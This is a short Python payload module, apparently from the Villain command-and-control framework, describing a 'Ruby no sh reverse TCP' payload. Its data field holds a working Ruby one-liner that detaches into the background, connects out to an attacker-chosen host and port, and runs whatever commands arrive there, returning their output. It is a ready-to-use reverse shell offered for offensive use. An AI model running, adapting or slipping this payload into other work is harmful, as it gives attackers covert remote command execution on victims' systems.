# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Ruby no sh reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Ruby no sh reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'ruby-no-sh-reverse-tcp',
        'os' : 'linux' 
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "nohup ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"*LHOST*\",\"*LPORT*\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}' > /dev/null 2>&1 & disown"
